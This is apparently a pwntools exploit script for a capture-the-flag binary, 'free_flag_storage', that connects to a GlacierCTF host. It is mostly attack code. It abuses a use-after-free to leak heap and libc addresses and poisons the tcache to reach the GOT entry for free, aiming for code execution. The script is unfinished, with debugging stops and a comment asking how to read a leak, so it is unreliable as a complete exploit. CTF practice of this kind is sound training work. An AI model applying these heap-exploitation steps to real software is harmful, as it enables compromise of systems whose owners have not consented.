#!/usr/bin/env python3

from pwn import *

exe = ELF("./free_flag_storage_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

# split tmux pane
#context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
context.terminal = ["tmux", "neww", "-n", "shell"]

#context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc challs.glacierctf.com 13377"	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b main 
c
b _IO_cleanup
#catch syscall write
"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)



def add(r, len, value, id, score):
    r.sendline(b'add')
    r.sendlineafter(b': ',len)
    r.sendlineafter(b'value:',value)
    r.sendlineafter(b'challenge_id: ',id)
    r.sendlineafter(b'score: ',score)
    
    
def delete(r, idx):
    r.sendline(b'delete')
    #r.interactive()
    r.sendlineafter(b'delete:\n',f'{idx}')
    #return rl().strip().decode();

def edit(r, idx, value, id, score):
    r.sendline(b'edit')
    r.sendlineafter(b'edit:',f"{idx}")
    r.sendlineafter(b'):',value)
    r.sendlineafter(b'challenge_id: ',id)
    r.sendlineafter(b'score:',score)

def show():
	sl(b'print')
	ru(b'flags:\n\t\t')
	return ru(b'Enter')




def main():
	buffer = p32(0x804b04c)
	free_got = p32(exe.got.free)
	free = p32(exe.plt.free)
	add(r, b'16', b'0', b'0', b'0')
	add(r, b'16', b'0', b'0', b'0')
	#add(r, b'20', b'0', b'0', b'0')

	delete(r, 0)	
	

	# edit 
	sl(b'edit')
	sla(b'edit:',"0")

	# heap leak
	ru(b'max size ')
	heap = eval(ru(b')').decode()[:-1]) - 0x1190
	chunk_int = heap + 0x1190  
	aleak('chunk',chunk_int)
	chunk = p32(chunk_int) 

	# edit pt 2
	aleak('heap',heap)
	sla(b':', chunk) # next pointer
	sla(b'challenge_id:', b'0')
	sla(b'score:', chunk)
	
	#add(r, b'20',chunk, chunk, chunk)
	r.interactive()
	delete(r, 0)
	edit(r, 0, (chunk), (chunk), (chunk)) #ARB ADDR IN TCACHE
	add(r, b'20', chunk, chunk, chunk) 
	edit(r, 0, (chunk), (chunk), (chunk)) # goes in tcache 
	#r.interactive()
	add(r, b'40', p32(chunk_int), (chunk), (chunk)) 
	delete(r, 0) # goes in fastbin
	#r.interactive()
	edit(r, 0, p32(exe.got.free), p32(exe.got.free), p32(exe.got.free))
	add(r, b'40',b'0', b'0',b'0') # i have libc addr in tcache, how to read it???
	#delete(r,0)
	edit(r, 0, p32(exe.got.free), p32(exe.got.free), p32(exe.got.free))

	#add(r, b'20', b'0',b'0',b'0')
	# leak libc? 
	sl(b'edit')
	sla(b'edit:',b'2')
	ru(b'max size ')
	libc_leak = eval(ru(b')').decode()[:-1])
	aleak('libc_leak',libc_leak)
	sla(b':', p32(exe.plt.puts))
	sla(b'challenge_id:', b'2')
	sla(b'score:', p32(exe.plt.puts))
	


	print(show())

	#delete(r,1)
	#r.interactive()
	#add(r, b'20', b'0',b'0',b'0')

	r.interactive()


if __name__ == "__main__":
    main()

